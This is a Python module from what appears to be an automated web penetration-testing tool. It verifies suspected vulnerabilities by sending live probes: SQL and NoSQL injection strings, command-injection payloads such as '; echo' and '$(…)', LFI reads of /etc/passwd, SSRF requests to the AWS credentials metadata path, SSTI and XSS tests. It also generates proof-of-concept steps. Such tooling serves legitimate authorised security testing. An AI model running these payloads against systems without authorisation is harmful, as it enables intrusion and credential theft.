"""
Verifier — Confirmation loops, not single-shot triage.

When a finding is detected, this module:
1. Re-tests with canary strings to confirm reflection
2. Validates with a second, more targeted request
3. Eliminates false positives before counting as validated
4. Generates working PoC exploit steps
"""

import json
import re
import time
import hashlib
from typing import Dict, List, Any, Tuple
from urllib.parse import urlparse, parse_qs, urlencode


class Verifier:
    """
    Verification loops — re-test findings before counting them.

    The key insight: if triage says "likely real," the hands should
    attempt to confirm it with a second, more targeted request.
    """

    def __init__(self, tools=None):
        self.tools = tools
        self.verified_findings = []
        self.rejected_findings = []

    # ─── Main Verification Entry Point ───────────────────────────

    async def verify_finding(self, finding: dict, original_url: str = None) -> dict:
        """
        Verify a single finding with targeted re-tests.
        Returns the finding with verification status added.
        """
        vuln_class = finding.get("type", finding.get("vuln_class", "")).lower()
        url = finding.get("url", original_url)
        param = finding.get("param", "")
        payload = finding.get("payload", "")

        verification = {
            "status": "unverified",
            "confidence": finding.get("confidence", 0.5),
            "verification_tests": [],
            "false_positive_reasons": [],
        }

        # Route to class-specific verification
        if "xss" in vuln_class:
            result = await self._verify_xss(url, param, payload)
        elif "sqli" in vuln_class:
            result = await self._verify_sqli(url, param, payload)
        elif "ssrf" in vuln_class:
            result = await self._verify_ssrf(url, param, payload)
        elif "idor" in vuln_class:
            result = await self._verify_idor(url, param, payload)
        elif "ssti" in vuln_class:
            result = await self._verify_ssti(url, param, payload)
        elif "lfi" in vuln_class:
            result = await self._verify_lfi(url, param, payload)
        elif "command" in vuln_class:
            result = await self._verify_command_injection(url, param, payload)
        elif "auth" in vuln_class:
            result = await self._verify_auth_bypass(url, finding)
        elif "open_redirect" in vuln_class or "redirect" in vuln_class:
            result = await self._verify_open_redirect(url, param, payload)
        elif "nosqli" in vuln_class:
            result = await self._verify_nosqli(url, param, payload)
        else:
            result = await self._verify_generic(url, param, payload)

        verification.update(result)

        # Update confidence based on verification
        if verification["status"] == "verified":
            verification["confidence"] = min(0.95, finding.get("confidence", 0.5) + 0.3)
            self.verified_findings.append(finding)
        elif verification["status"] == "false_positive":
            verification["confidence"] = max(0.1, finding.get("confidence", 0.5) - 0.4)
            self.rejected_findings.append(finding)

        finding["verification"] = verification
        return finding

    async def verify_batch(self, findings: list) -> list:
        """Verify a batch of findings."""
        verified = []
        for finding in findings:
            result = await self.verify_finding(finding)
            verified.append(result)
        return verified

    # ─── XSS Verification ────────────────────────────────────────

    async def _verify_xss(self, url: str, param: str, payload: str) -> dict:
        """
        Verify XSS by:
        1. Sending canary payload with unique marker
        2. Checking if marker reflects unescaped
        3. Testing context (HTML, attribute, JS)
        """
        canary = f"pentdem_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
        canary_payload = f"<pentdem>{canary}</pentdem>"

        tests = []

        # Test 1: Canary reflection
        test_url = self._inject_param(url, param, canary_payload)
        resp = await self._make_request(test_url)
        pr = self._parse_response(resp.get("raw", ""))

        test_result = {
            "test": "canary_reflection",
            "payload": canary_payload,
            "reflected": canary in pr["body"],
            "escaped": self._is_html_escaped(canary, pr["body"]),
            "status_code": pr["status"],
        }
        tests.append(test_result)

        if canary not in pr["body"]:
            return {
                "status": "false_positive",
                "reason": "Canary string not reflected in response",
                "verification_tests": tests,
            }

        if self._is_html_escaped(canary, pr["body"]):
            return {
                "status": "false_positive",
                "reason": "Canary reflected but HTML-escaped",
                "verification_tests": tests,
            }

        # Test 2: Context detection
        context = self._detect_xss_context(canary, pr["body"])
        test_result_2 = {
            "test": "context_detection",
            "context": context,
        }
        tests.append(test_result_2)

        # Test 3: Verify original payload also works
        if payload:
            test_url_2 = self._inject_param(url, param, payload)
            resp_2 = await self._make_request(test_url_2)
            pr_2 = self._parse_response(resp_2.get("raw", ""))

            test_result_3 = {
                "test": "original_payload_verification",
                "payload": payload,
                "reflected": payload in pr_2["body"] or self._xss_reflected(payload, pr_2["body"]),
            }
            tests.append(test_result_3)

        return {
            "status": "verified",
            "reason": f"XSS confirmed — canary reflects unescaped in {context} context",
            "verification_tests": tests,
            "context": context,
            "poc_steps": [
                f"1. Navigate to: {url}",
                f"2. Inject payload in {param}: {payload}",
                f"3. Observe execution in {context} context",
            ],
        }

    def _detect_xss_context(self, marker: str, body: str) -> str:
        """Detect where the XSS payload lands in the HTML."""
        # In an attribute
        if re.search(rf'<[^>]+{re.escape(marker)}[^>]*>', body):
            return "html_attribute"
        # In a script tag
        if re.search(rf'<script[^>]*>.*{re.escape(marker)}.*</script>', body, re.DOTALL):
            return "javascript"
        # In HTML body
        if re.search(rf'>[^<]*{re.escape(marker)}[^<]*<', body):
            return "html_body"
        # In a comment
        if re.search(rf'<!--.*{re.escape(marker)}.*-->', body):
            return "html_comment"
        return "unknown"

    def _is_html_escaped(self, marker: str, body: str) -> bool:
        """Check if the marker is HTML-escaped."""
        escaped_forms = [
            marker.replace("<", "&lt;").replace(">", "&gt;"),
            marker.replace("<", "&#60;").replace(">", "&#62;"),
            marker.replace("<", "&#x3C;").replace(">", "&#x3E;"),
        ]
        return any(esc in body for esc in escaped_forms)

    def _xss_reflected(self, payload: str, body: str) -> bool:
        """Check if XSS payload is reflected (even partially)."""
        if payload in body:
            return True
        # Check key parts
        if "<script>" in payload and "<script>" in body.lower():
            return True
        if "alert" in payload and "alert" in body:
            return True
        return False

    # ─── SQLi Verification ───────────────────────────────────────

    async def _verify_sqli(self, url: str, param: str, payload: str) -> dict:
        """
        Verify SQLi by:
        1. Sending canary in UNION to confirm output channel
        2. Testing boolean-based blind (true/false comparison)
        3. Confirming error-based (if error was the signal)
        """
        canary = f"pentdem{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
        tests = []

        # Test 1: UNION-based confirmation
        union_payload = f"' UNION SELECT '{canary}'--"
        test_url = self._inject_param(url, param, union_payload)
        resp = await self._make_request(test_url)
        pr = self._parse_response(resp.get("raw", ""))

        test_result = {
            "test": "union_canary",
            "payload": union_payload,
            "canary_found": canary in pr["body"],
            "status_code": pr["status"],
        }
        tests.append(test_result)

        if canary in pr["body"]:
            return {
                "status": "verified",
                "reason": "SQLi confirmed — UNION-based data exfiltration works",
                "verification_tests": tests,
                "poc_steps": [
                    f"1. Navigate to: {url}",
                    f"2. Inject in {param}: ' UNION SELECT 'YOUR_DATA'--",
                    f"3. Observe YOUR_DATA reflected in response",
                ],
            }

        # Test 2: Boolean-based blind
        true_payload = "' OR '1'='1'--"
        false_payload = "' OR '1'='2'--"

        true_url = self._inject_param(url, param, true_payload)
        false_url = self._inject_param(url, param, false_payload)

        true_resp = await self._make_request(true_url)
        false_resp = await self._make_request(false_url)

        true_pr = self._parse_response(true_resp.get("raw", ""))
        false_pr = self._parse_response(false_resp.get("raw", ""))

        test_result_2 = {
            "test": "boolean_blind",
            "true_response_size": len(true_pr["body"]),
            "false_response_size": len(false_pr["body"]),
            "different": len(true_pr["body"]) != len(false_pr["body"]),
        }
        tests.append(test_result_2)

        if len(true_pr["body"]) != len(false_pr["body"]):
            return {
                "status": "verified",
                "reason": "SQLi confirmed — boolean-based blind (true≠false response sizes)",
                "verification_tests": tests,
                "poc_steps": [
                    f"1. Navigate to: {url}",
                    f"2. Inject true condition: {true_payload}",
                    f"3. Inject false condition: {false_payload}",
                    f"4. Observe different response sizes",
                ],
            }

        # Test 3: Error-based confirmation
        error_payload = "'"
        error_url = self._inject_param(url, param, error_payload)
        error_resp = await self._make_request(error_url)
        error_pr = self._parse_response(error_resp.get("raw", ""))

        sql_errors = ["sql", "mysql", "syntax", "unclosed", "quotation", "odbc"]
        has_error = any(e in error_pr["body"].lower() for e in sql_errors)

        test_result_3 = {
            "test": "error_based",
            "single_quote_causes_error": has_error,
        }
        tests.append(test_result_3)

        if has_error:
            return {
                "status": "verified",
                "reason": "SQLi confirmed — single quote causes SQL error",
                "verification_tests": tests,
            }

        return {
            "status": "unverified",
            "reason": "Could not confirm SQLi with verification tests",
            "verification_tests": tests,
        }

    # ─── SSRF Verification ───────────────────────────────────────

    async def _verify_ssrf(self, url: str, param: str, payload: str) -> dict:
        """
        Verify SSRF by:
        1. Using canary domain (dnslog or Burp Collaborator)
        2. Checking for internal content in response
        3. Testing with different internal IPs
        """
        tests = []
        canary_domain = f"pentdem-{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.dnslog.cn"

        # Test 1: Canary DNS
        canary_url = f"http://{canary_domain}"
        test_url = self._inject_param(url, param, canary_url)
        resp = await self._make_request(test_url)
        pr = self._parse_response(resp.get("raw", ""))

        test_result = {
            "test": "canary_dns",
            "payload": canary_url,
            "status_code": pr["status"],
        }
        tests.append(test_result)

        # Test 2: Internal metadata (AWS)
        metadata_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ]

        for meta_payload in metadata_payloads:
            meta_url = self._inject_param(url, param, meta_payload)
            meta_resp = await self._make_request(meta_url)
            meta_pr = self._parse_response(meta_resp.get("raw", ""))

            internal_indicators = ["ami-id", "instance-id", "iam", "security-credentials",
                                   "root", "metadata"]
            has_internal = any(ind in meta_pr["body"].lower() for ind in internal_indicators)

            test_result = {
                "test": "internal_metadata",
                "payload": meta_payload,
                "internal_content_leaked": has_internal,
            }
            tests.append(test_result)

            if has_internal:
                return {
                    "status": "verified",
                    "reason": "SSRF confirmed — AWS metadata accessible",
                    "verification_tests": tests,
                    "severity": "critical",
                    "poc_steps": [
                        f"1. Navigate to: {url}",
                        f"2. Inject in {param}: {meta_payload}",
                        f"3. Observe AWS metadata in response",
                    ],
                }

        # Test 3: Internal network scan
        internal_payloads = [
            ("http://127.0.0.1:80/", "localhost:80"),
            ("http://127.0.0.1:8080/", "localhost:8080"),
            ("http://10.0.0.1/", "internal network"),
        ]

        for int_payload, desc in internal_payloads:
            int_url = self._inject_param(url, param, int_payload)
            int_resp = await self._make_request(int_url)
            int_pr = self._parse_response(int_resp.get("raw", ""))

            if int_pr["status"] in (200, 301, 302):
                test_result = {
                    "test": "internal_network",
                    "payload": int_payload,
                    "accessible": True,
                }
                tests.append(test_result)

                return {
                    "status": "verified",
                    "reason": f"SSRF confirmed — {desc} accessible",
                    "verification_tests": tests,
                }

        return {
            "status": "unverified",
            "reason": "Could not confirm SSRF with verification tests",
            "verification_tests": tests,
        }

    # ─── IDOR Verification ───────────────────────────────────────

    async def _verify_idor(self, url: str, param: str, payload: str) -> dict:
        """
        Verify IDOR by:
        1. Comparing response sizes between original and manipulated
        2. Checking if user-specific data changes
        3. Testing with authenticated vs unauthenticated
        """
        tests = []

        # Test 1: Response comparison
        original_resp = await self._make_request(url)
        original_pr = self._parse_response(original_resp.get("raw", ""))

        manipulated_url = self._inject_param(url, param, payload)
        manipulated_resp = await self._make_request(manipulated_url)
        manipulated_pr = self._parse_response(manipulated_resp.get("raw", ""))

        test_result = {
            "test": "response_comparison",
            "original_size": len(original_pr["body"]),
            "manipulated_size": len(manipulated_pr["body"]),
            "same_status": original_pr["status"] == manipulated_pr["status"],
            "data_changed": len(original_pr["body"]) != len(manipulated_pr["body"]),
        }
        tests.append(test_result)

        # Check for user-specific data in response
        user_indicators = ["email", "phone", "address", "name", "profile",
                           "account", "settings", "balance", "order"]

        has_user_data = any(ind in manipulated_pr["body"].lower() for ind in user_indicators)
        has_error = any(ind in manipulated_pr["body"].lower() for ind in
                       ("not found", "unauthorized", "forbidden", "error", "invalid"))

        test_result_2 = {
            "test": "user_data_check",
            "has_user_data": has_user_data,
            "has_error": has_error,
        }
        tests.append(test_result_2)

        if has_user_data and not has_error:
            return {
                "status": "verified",
                "reason": "IDOR confirmed — user data accessible with different ID",
                "verification_tests": tests,
                "poc_steps": [
                    f"1. Navigate to: {url}",
                    f"2. Change {param} to: {payload}",
                    f"3. Observe different user's data returned",
                ],
            }

        if test_result["data_changed"] and test_result["same_status"]:
            return {
                "status": "likely_verified",
                "reason": "IDOR likely — response size changes with different ID",
                "verification_tests": tests,
            }

        return {
            "status": "unverified",
            "reason": "Could not confirm IDOR — response appears identical",
            "verification_tests": tests,
        }

    # ─── SSTI Verification ───────────────────────────────────────

    async def _verify_ssti(self, url: str, param: str, payload: str) -> dict:
        """Verify SSTI by confirming math operations."""
        tests = []

        math_payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("{{7*7}}", "49"),
        ]

        for test_payload, expected in math_payloads:
            test_url = self._inject_param(url, param, test_payload)
            resp = await self._make_request(test_url)
            pr = self._parse_response(resp.get("raw", ""))

            test_result = {
                "test": "math_operation",
                "payload": test_payload,
                "expected": expected,
                "found": expected in pr["body"],
            }
            tests.append(test_result)

            if expected in pr["body"]:
                return {
                    "status": "verified",
                    "reason": f"SSTI confirmed — math operation {test_payload} = {expected}",
                    "verification_tests": tests,
                    "poc_steps": [
                        f"1. Navigate to: {url}",
                        f"2. Inject in {param}: {{{{7*7}}}}",
                        f"3. Observe '49' in response",
                    ],
                }

        return {
            "status": "unverified",
            "reason": "Could not confirm SSTI — math operations not evaluated",
            "verification_tests": tests,
        }

    # ─── LFI Verification ────────────────────────────────────────

    async def _verify_lfi(self, url: str, param: str, payload: str) -> dict:
        """Verify LFI by reading known files."""
        tests = []

        lfi_payloads = [
            ("../../../../etc/passwd", "root:"),
            ("/etc/passwd", "root:"),
            ("../../../../etc/hosts", "localhost"),
            ("..\\..\\..\\..\\windows\\win.ini", "["),
        ]

        for test_payload, marker in lfi_payloads:
            test_url = self._inject_param(url, param, test_payload)
            resp = await self._make_request(test_url)
            pr = self._parse_response(resp.get("raw", ""))

            test_result = {
                "test": "file_read",
                "payload": test_payload,
                "marker": marker,
                "found": marker in pr["body"],
            }
            tests.append(test_result)

            if marker in pr["body"]:
                return {
                    "status": "verified",
                    "reason": f"LFI confirmed — can read {test_payload}",
                    "verification_tests": tests,
                    "poc_steps": [
                        f"1. Navigate to: {url}",
                        f"2. Inject in {param}: {test_payload}",
                        f"3. Observe file contents in response",
                    ],
                }

        return {
            "status": "unverified",
            "reason": "Could not confirm LFI — known file markers not found",
            "verification_tests": tests,
        }

    # ─── Command Injection Verification ──────────────────────────

    async def _verify_command_injection(self, url: str, param: str, payload: str) -> dict:
        """Verify command injection with canary command."""
        tests = []
        canary = f"pentdem_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"

        cmd_payloads = [
            (f"; echo {canary}", canary),
            (f"| echo {canary}", canary),
            (f"|| echo {canary}", canary),
            (f"`echo {canary}`", canary),
            (f"$(echo {canary})", canary),
        ]

        for test_payload, expected in cmd_payloads:
            test_url = self._inject_param(url, param, test_payload)
            resp = await self._make_request(test_url)
            pr = self._parse_response(resp.get("raw", ""))

            test_result = {
                "test": "canary_echo",
                "payload": test_payload,
                "expected": expected,
                "found": expected in pr["body"],
            }
            tests.append(test_result)

            if expected in pr["body"]:
                return {
                    "status": "verified",
                    "reason": f"Command injection confirmed — canary echoed back",
                    "verification_tests": tests,
                    "poc_steps": [
                        f"1. Navigate to: {url}",
                        f"2. Inject in {param}: {test_payload}",
                        f"3. Observe canary '{canary}' in response",
                    ],
                }

        return {
            "status": "unverified",
            "reason": "Could not confirm command injection — canary not echoed",
            "verification_tests": tests,
        }

    # ─── Auth Bypass Verification ────────────────────────────────

    async def _verify_auth_bypass(self, url: str, finding: dict) -> dict:
        """Verify auth bypass by comparing authenticated vs unauthenticated."""
        tests = []

        # Get the bypass technique used
        headers = finding.get("headers", {})
        technique = finding.get("bypass_technique", "")

        # Test 1: Normal request (should be 401/403)
        normal_resp = await self._make_request(url)
        normal_pr = self._parse_response(normal_resp.get("raw", ""))

        # Test 2: With bypass
        bypass_resp = await self._make_request(url, headers=headers)
        bypass_pr = self._parse_response(bypass_resp.get("raw", ""))

        test_result = {
            "test": "response_comparison",
            "normal_status": normal_pr["status"],
            "bypass_status": bypass_pr["status"],
            "status_changed": normal_pr["status"] != bypass_pr["status"],
            "body_size_changed": len(normal_pr["body"]) != len(bypass_pr["body"]),
        }
        tests.append(test_result)

        # Auth bypass confirmed if status goes from 401/403 to 200
        if normal_pr["status"] in (401, 403) and bypass_pr["status"] == 200:
            return {
                "status": "verified",
                "reason": f"Auth bypass confirmed — {technique} changes 401/403 → 200",
                "verification_tests": tests,
                "poc_steps": [
                    f"1. Normal request to {url} → {normal_pr['status']}",
                    f"2. Add header: {headers}",
                    f"3. Request now returns 200",
                ],
            }

        if test_result["status_changed"] or test_result["body_size_changed"]:
            return {
                "status": "likely_verified",
                "reason": f"Auth bypass likely — response differs with {technique}",
                "verification_tests": tests,
            }

        return {
            "status": "unverified",
            "reason": "Could not confirm auth bypass",
            "verification_tests": tests,
        }

    # ─── Open Redirect Verification ──────────────────────────────

    async def _verify_open_redirect(self, url: str, param: str, payload: str) -> dict:
        """Verify open redirect by checking for redirect to external URL."""
        tests = []

        # Use a canary URL
        canary = f"https://pentdem-verify-{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.com"
        test_url = self._inject_param(url, param, canary)

        resp = await self._make_request(test_url, follow_redirects=False)
        pr = self._parse_response(resp.get("raw", ""))

        test_result = {
            "test": "redirect_check",
            "payload": canary,
            "status": pr["status"],
            "is_redirect": pr["status"] in (301, 302, 303, 307, 308),
            "location_header": pr["headers"].get("location", ""),
            "redirects_to_canary": canary in pr["headers"].get("location", ""),
        }
        tests.append(test_result)

        if test_result["redirects_to_canary"]:
            return {
                "status": "verified",
                "reason": "Open redirect confirmed — redirects to external URL",
                "verification_tests": tests,
                "poc_steps": [
                    f"1. Navigate to: {url}",
                    f"2. Inject in {param}: {canary}",
                    f"3. Observe redirect to {canary}",
                ],
            }

        return {
            "status": "unverified",
            "reason": "Could not confirm open redirect",
            "verification_tests": tests,
        }

    # ─── NoSQLi Verification ─────────────────────────────────────

    async def _verify_nosqli(self, url: str, param: str, payload: str) -> dict:
        """Verify NoSQL injection."""
        tests = []

        # Test with JSON operator injection
        nosql_payloads = [
            ('{"$gt": ""}', "operator_injection"),
            ('{"$ne": null}', "not_equal_injection"),
            ('{"$regex": ".*"}', "regex_injection"),
        ]

        for test_payload, technique in nosql_payloads:
            test_url = self._inject_param(url, param, test_payload)
            resp = await self._make_request(test_url, method="POST",
                                           data=test_payload,
                                           headers={"Content-Type": "application/json"})
            pr = self._parse_response(resp.get("raw", ""))

            test_result = {
                "test": "nosql_operator",
                "payload": test_payload,
                "technique": technique,
                "status": pr["status"],
            }
            tests.append(test_result)

            if pr["status"] == 200:
                return {
                    "status": "likely_verified",
                    "reason": f"NoSQL injection likely — {technique} accepted",
                    "verification_tests": tests,
                }

        return {
            "status": "unverified",
            "reason": "Could not confirm NoSQL injection",
            "verification_tests": tests,
        }

    # ─── Generic Verification ────────────────────────────────────

    async def _verify_generic(self, url: str, param: str, payload: str) -> dict:
        """Generic verification — re-test with canary."""
        tests = []
        canary = f"pentdem_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"

        test_url = self._inject_param(url, param, canary)
        resp = await self._make_request(test_url)
        pr = self._parse_response(resp.get("raw", ""))

        test_result = {
            "test": "canary_reflection",
            "payload": canary,
            "found": canary in pr["body"],
        }
        tests.append(test_result)

        return {
            "status": "unverified",
            "reason": "Generic verification — canary test only",
            "verification_tests": tests,
        }

    # ─── Helpers ─────────────────────────────────────────────────

    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject a value into a URL parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if param:
            params[param] = [value]
        else:
            # Append as new param
            params["pentdem"] = [value]

        query_string = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

    async def _make_request(self, url: str, method: str = "GET",
                           headers: dict = None, data: str = None,
                           follow_redirects: bool = True,
                           timeout: int = 10) -> dict:
        """Make HTTP request using curl."""
        if not self.tools:
            return {"raw": "", "success": False}

        cmd = ["curl", "-s", "-i", "--max-time", str(timeout)]
        if follow_redirects:
            cmd.append("-L")
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        if method == "POST":
            cmd.extend(["-X", "POST"])
            if data:
                cmd.extend(["--data", data])
        elif method in ("PUT", "DELETE", "PATCH"):
            cmd.extend(["-X", method])
            if data:
                cmd.extend(["--data", data])
        cmd.append(url)

        result = await self.tools.run("curl", cmd[1:])
        return {
            "raw": result.get("stdout", ""),
            "success": result.get("success", False),
        }

    def _parse_response(self, raw: str) -> dict:
        """Parse raw HTTP response."""
        parts = raw.split("\r\n\r\n", 1)
        headers_raw = parts[0] if parts else ""
        body = parts[1] if len(parts) > 1 else ""

        status_match = re.search(r"HTTP/\d\.\d\s+(\d+)", headers_raw)
        status = int(status_match.group(1)) if status_match else 0

        headers = {}
        for line in headers_raw.split("\n")[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()

        return {"status": status, "headers": headers, "body": body[:5000]}

    # ─── Statistics ──────────────────────────────────────────────

    def get_stats(self) -> dict:
        """Get verification statistics."""
        return {
            "verified": len(self.verified_findings),
            "rejected": len(self.rejected_findings),
            "total_verified": len(self.verified_findings),
            "total_rejected": len(self.rejected_findings),
        }
